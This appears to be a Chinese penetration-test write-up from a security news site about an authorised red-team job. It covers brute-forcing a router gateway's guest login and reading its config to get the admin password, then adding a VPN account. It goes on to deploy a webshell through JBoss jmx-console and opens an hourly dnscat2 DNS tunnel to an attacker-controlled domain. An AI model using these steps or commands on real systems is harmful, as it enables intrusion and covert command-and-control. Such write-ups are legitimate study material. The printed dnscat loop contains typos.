# 从网关进入内网到DNS协议出网

阅读量 **293792**

|评论 **2**

发布时间 : 2020-11-13 15:30:15

 **x**

##### 译文声明

本文是翻译文章

原文地址：<https://mp.weixin.qq.com/s/_LjtSgwv7fWDEjPgh_1tZw>

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p5.ssl.qhimg.com/t01a4abf4df66378e90.png)

在一个风和日丽的下午，特别适合躺在草坪睡大觉。六点十五分临近下班，突然微信响了。脑子里冒出“嗯哼？？？难道有小姐姐约我。”打开一看，被leader拉到一个群里，Oh
My God
快下班了，又要吩咐干活的节奏，时间紧迫，果然技术汪是不配有私生活的。在群里跟客户以及销售对接，收集了下测试的范围、客户需求、注意事项、以及项目完结的标准是什么等等。客户表示当红队评估的标准来干就好，如果你能横向内网的话就搞叭（此时的我仿佛在微信上看到客户露出诡异的笑容。）这是瞧不起我？不服气，给授权书，整，打穿他内网，就完事。

![](https://p5.ssl.qhimg.com/t01c3b192d5221de8e5.png)

客户已经整理好一份列表，首先打开资产列表。提句题外话 ，你知道为什么人类要发明工具吗？因为长期劳动中都处于艰难的环境当中，然而工具的发明让人类能改善劳动。

作为脚本小子（工具党），当然是直接把URL链接整理一份，搭建好的Xray+Awvs一把梭。直接再慢慢一个个从Fofa、傻蛋、钟馗之眼等网络测绘引擎查询资产，使用端口探测nmap、和敏感文件、目录扫描工具，以及全球最大的程序员友好交流社区
github.com、网盘等等进行搜索和资产探测和漏洞扫描。

![](https://p0.ssl.qhimg.com/t01dbd92292ad179389.jpg)

配置完工具，一看时间晚上七点十分，正好可以去楼下饭堂明目张胆的薅公司羊毛，吃个饭，慢悠悠点根烟再回来慢慢看。三十分钟过去后，回来一看工具已经跑完了，这大概就是***的力量叭。

![](https://p4.ssl.qhimg.com/t01cb18d298c119f996.jpg)

打开漏洞扫描报告发现事情并不简单，只有一堆低危漏洞跟js框架版本太低可能造成xss，嗯？就这？就这？什么？？？顿时感觉刚吃的饭不香了，也难怪刚才客户在群里表现的很有自信的样子
。花了三十分钟把漏扫报告导出来套模版写完交差，晚上八点二十分，leader看到我的报告，表示很认可，本章节完。

![](https://p0.ssl.qhimg.com/t01ab046a83dd9d0b20.jpg)

其实这只是我幻想的，我骗你们的呢。leader看完后，表示你明天可以回村里种地了，不用过来上班。

![](https://p1.ssl.qhimg.com/t015b7919805c7cc241.jpg)

呵，我岂是会为了这五斗米弯腰？

“开个玩笑，开个玩笑，我还没开始发力。”

“还有五天，你再好好看看。”

##

## 正式开始

##

害，这一届安全（hun
zi）真不好做，内心嘀咕着。捡起饭碗，接着看信息收集的列表，打开URL一个个看，看到一个特征SiteFiles，这不就是SiteServer嘛。

![](https://p4.ssl.qhimg.com/t0172af7a7c8274cbfe.png)

内心表示暗暗有戏，这道题我会，去年才看过有人分析事件有黑产利用的1day。小手一抖直接在URL后加上/SiteServer/

![](https://p2.ssl.qhimg.com/t01165553601eaeb733.png)

Oh…yee！？？再一顿目录扫描，好的凉了半截。

![](https://p1.ssl.qhimg.com/t01c14c1d2462b34193.png)

找不到后台，完全无望。如同编译工具时返回报错，告诉你找不到对象。本想着利用一波后台远程模版下载webshell，直捣dmz区黄龙。

![](https://p3.ssl.qhimg.com/t0168c7db1714898125.jpg)

只能回来再慢慢翻看看其他web资产，找了半天无果，一看凌晨十二点，该洗洗睡了，熬夜=秃头+猝死，秃头=找不到女朋友，溜了溜了。第二天起来再继续。

## 次日再战

多次尝试识别cms，继续掏出我的nday怼了一通，百思不得其webshell，大概这就是彩笔（hun zi）叭，脑海里响起老周的教导,只有不努力的黑客……。

![](https://p1.ssl.qhimg.com/t01e4facb9cbb6833f9.png)

不能就这么算，翻着翻着nmap端口扫描记录，找到一个8080端口X捷的路由网关，它长这样：

![](https://p2.ssl.qhimg.com/t01ffb1c4e99486ce24.png)

果断上wooyun备份库搜索一波记录学习姿势。

![](https://p1.ssl.qhimg.com/t01fdae41145b6ed6b6.png)

知道默认存在三个账号admin/master/guest。

掏出BurpSuite尝试爆破密码,由于它的账号密码是在auth这块进行校验，经过了base64编码，并且在密码后加个多余字符串的7(密码等级为7)。这里我们在linux下使用awk重新生成下字典。

![](https://p5.ssl.qhimg.com/t01321cd415e6f298f9.png)

    
    
    root@x-5d67ef:~# awk '{print "guest:"$0}' x_pass.txt > x_pass_2.txt
    
    
    root@x-5d67ef:~# awk '{print $0"7"}' x_pass_2.txt > x_pass_3.txt

得到字典。

![](https://p3.ssl.qhimg.com/t0139d594f442ce3ec8.png)

接着导入我们的字典，我简单跑一下就设置了password top 100.以及base64编码一下。

![](https://p0.ssl.qhimg.com/t015125da123ca54a61.png)

得到账号密码为guest/guest，登录后针对/ LEVEL15/接口，修改command参数进行查看配置信息show run.

![](https://p3.ssl.qhimg.com/t01afcefc23235fc87d.png)

发现管理员admin密码为pwd!12345，害还是字典不够强大，不过读配置能看到也行（也可以把guest提权成admin，不过怕被发现尽量少留痕迹，能复用他原来的密码尽量复用）。Web页面登录管理员账号admin添加SSL
VPN账号user1/123456。

![](https://p5.ssl.qhimg.com/t014490b8cdeffaf6f6.png)

### 参考文献

《X捷EG易网关guest越权,可执行任意命令，通过vpn直接渗透内网》

《【RG-EG】RG-EG （网关模式）VPN功能配置SSL VPN》

## 内网渗透

拨入内网后，通过前面在路由器网关页面里查看到的配置信息。

![](https://p3.ssl.qhimg.com/t01e5fc78013591c3b3.jpg)

得知内网IP大概有三个段，优先针对已知的信息进行常用端口探测（先不考虑可能改端口的情况）可以节约大部分时间，实在不行再尝试探测大A／B／C段IP存活，确定存活后再决定下一步端口探测。

![](https://p0.ssl.qhimg.com/t01969018f559664ec1.png)

通过一顿内网资产探测，找到两台使用了JBOSS中间件，确定存在对应漏洞，尝试各种exp直接远程命令执行，反弹nc无效，感觉做了VLAN隔离，我们这边只能访问业务服务器HTTP/HTTPS的web服务，而业务服务器无法访问我们指定的端口跟我们进行通信。那远程溢出不了，我们只能通过本地部署war包嵌套一句话木马进去，通过web服务协议访问webshell进行交互。

    
    
    http://10.x.x.50:8080/jmxconsole/HtmlAdaptor?action=inspectMBean&nam 
    e=jboss.admin:service=DeploymentFileRepository,定位到store⽅法。

![](https://p5.ssl.qhimg.com/t01e5645253e40c6118.jpg)

尝试直接上传test.war部署一句话到网站根目录，尝试访问下失败。

自己本地搭建了一下vulhub，发现复现正常，没啥特殊情况。。

这边估计有做过什么限制， 想了想。

![](https://p4.ssl.qhimg.com/t01e3d8840680110227.png)

应该可以把war包部署到已知的目录下，比如Jmx-console.war。说干就干，本地复现成功。转到当前环境下进行实现。

先修改BaseDir到./deploy/：

![](https://p2.ssl.qhimg.com/t01cb9b329085d23d38.png)

接着修改P1修改 为jmx-console.war p2文件名 p3文件后缀名 p4 一句话木马。

![](https://p3.ssl.qhimg.com/t01dfbf30de5024d75b.png)

传⼊相应的值，即可getshell。

![](https://p4.ssl.qhimg.com/t011a74f8edb15bb91a.png)

嘿嘿成功拿到两台root，但发现果然跟猜想的一样，服务器无法正常访问外网，做了限制。

跟客户沟通了下，客户说可以继续，让我们看看能不能把内网的机器跟外网的机器进行通信。既然得到准许了，那接下来就可以继续发挥发挥。

尝试使用ping www.qq.com 发现无法ping通，说明ICMP协议不行，直接冰蝎尝试socks5也不支持。使用curl
访问外网也不行，说明http/https也不出网。直接用msf反弹tcp也不支持。

![](https://p5.ssl.qhimg.com/t01229c5f53fc6fdcbe.jpg)

Xd们把害怕打在公屏上。

接着想起多年溯源反制中，挖矿经常使用的DNS协议进行对外通信。查了下资料发现dnscat2可以支持，开源万岁，现学现卖。

先配置域名的dns。

![](https://p2.ssl.qhimg.com/t0130b280ce74d65a5c.png)

A记录配置一个指向攻击者VPS的IP。

例如A记录0，对应IP108.x.x.216。

NS记录配置你前面设置的A记录。

006.xxx.bio 对应0.xxx.bio.

![](https://p0.ssl.qhimg.com/t01ece0f427033b6287.png)

本地下载dnscat2，安装这里跳过，自己去看github上的文档叭。

本地执行监听：

./dnscat –dns domain=006.xxx.bio

接着上传client对应的代码到/tmp下。进行make编译。

编译完成后，执行命令。

![](https://p1.ssl.qhimg.com/t010b07856925c62770.png)

    
    
    nohup /bin/bash –c “white true; do /tmp/dnscat –dns domain=006.xxx.bio –max-retransmits 5”sleep 3600; done” > /dev/null 2 >&1

每隔一个小时进行反弹。

记住这里–dns domain一定要填域名，我前面测试尝试直接填IP进行dns
53端口通信发现不行（以及这个工具支持加密传输，如果怕被流量探测发现可以考虑把流量加密 参数–secret）。

成功反弹回来本地。

![](https://p1.ssl.qhimg.com/t015d19c51fb015696a.png)

然后？

![](https://p4.ssl.qhimg.com/t017f7fe4a169d5f5c6.jpg)

然后跟甲方爸爸汇报，甲方爸爸表示对咱们技术很认可，没必要再继续了。

![](https://p1.ssl.qhimg.com/t01cd092446b382c4a4.jpg)

## 总结回顾

  1. 对外网大量资产常规cms进行漏洞探测无果。
  2. 转战发现EG易网关。
  3. 通过EG易网关找到未授权命令执行，添加vpn进入内网。
  4. 对内网资产进行探测发现使用jboss中间件的服务器, 发现java反序列化无法直接利用。
  5. 本地搭建环境进行漏洞复现，通过本地部署webshell到其他目录下绕过限制。
  6. 发现各种协议无效，通过dns协议成功出网，结束本次项目。

本文翻译自 [原文链接](https://mp.weixin.qq.com/s/_LjtSgwv7fWDEjPgh_1tZw)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **酒仙桥六号部队** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/222570](/post/id/222570)

安全客 - 有思想的安全新媒体

本文转载自: [](https://mp.weixin.qq.com/s/_LjtSgwv7fWDEjPgh_1tZw)

如若转载,请注明出处： <https://mp.weixin.qq.com/s/_LjtSgwv7fWDEjPgh_1tZw>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [渗透测试](/tag/渗透测试)

 **+1** __15赞

 __收藏

![](https://p3.ssl.qhimg.com/t0110bc5d794d277012.png) 酒仙桥六号部队

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

